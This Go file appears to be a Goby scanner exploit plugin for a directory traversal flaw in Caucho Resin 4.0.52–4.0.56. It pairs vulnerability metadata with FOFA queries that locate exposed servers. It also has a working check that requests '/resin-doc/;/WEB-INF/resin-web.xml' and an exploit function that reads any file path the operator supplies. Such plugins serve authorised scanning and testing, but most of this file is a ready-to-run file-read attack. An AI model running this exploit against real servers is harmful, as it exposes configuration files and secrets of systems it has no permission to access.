package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Caucho Resin 4.0.52 4.0.56 Directory Traversal",
    "Description": "<p>Resin is Caucho's web server and Java application server.</p><p>Resin server version 4.0.52 to 4.0.56 has a directory traversal vulnerability. Attackers can use; to read web configuration files to take over the system further.</p>",
    "Impact": "Caucho Resin 4.0.52 4.0.56 Directory Traversal",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://caucho.com\">https://caucho.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Caucho Resin",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Caucho Resin 服务器 4.0.52 4.0.56 版本目录遍历漏洞",
            "Description": "<p>Resin是Caucho的Web服务器和Java应用程序服务器。</p><p>Resin服务器4.0.52至4.0.56版本存在目录遍历漏洞。攻击者可利用;来读取web配置文件进一步接管系统。</p>",
            "Impact": "<p>Resin服务器4.0.52至4.0.56版本存在目录遍历漏洞。攻击者可利用;来读取web配置文件进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://caucho.com\">https://caucho.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Caucho Resin",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Caucho Resin 4.0.52 4.0.56 Directory Traversal",
            "Description": "<p>Resin is Caucho's web server and Java application server.</p><p>Resin server version 4.0.52 to 4.0.56 has a directory traversal vulnerability. Attackers can use; to read web configuration files to take over the system further.</p>",
            "Impact": "Caucho Resin 4.0.52 4.0.56 Directory Traversal",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://caucho.com\">https://caucho.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Caucho Resin",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "banner=\"Resin/4.0.52\"|| header=\"Resin/4.0.52\"||banner=\"Resin/4.0.53\"|| header=\"Resin/4.0.53\"||banner=\"Resin/4.0.54\"|| header=\"Resin/4.0.54\"||banner=\"Resin/4.0.55\"|| header=\"Resin/4.0.55\"||banner=\"Resin/4.0.56\"|| header=\"Resin/4.0.56\"",
    "GobyQuery": "banner=\"Resin/4.0.52\"|| header=\"Resin/4.0.52\"||banner=\"Resin/4.0.53\"|| header=\"Resin/4.0.53\"||banner=\"Resin/4.0.54\"|| header=\"Resin/4.0.54\"||banner=\"Resin/4.0.55\"|| header=\"Resin/4.0.55\"||banner=\"Resin/4.0.56\"|| header=\"Resin/4.0.56\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://caucho.com",
    "DisclosureDate": "2021-11-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/WEB-INF/resin-web.xml",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [
            "Caucho Resin"
        ],
        "System": [],
        "Hardware": []
    },
    "PocId": "10238"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/resin-doc/;/WEB-INF/resin-web.xml"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "xmlns:resin") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/resin-doc/;" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
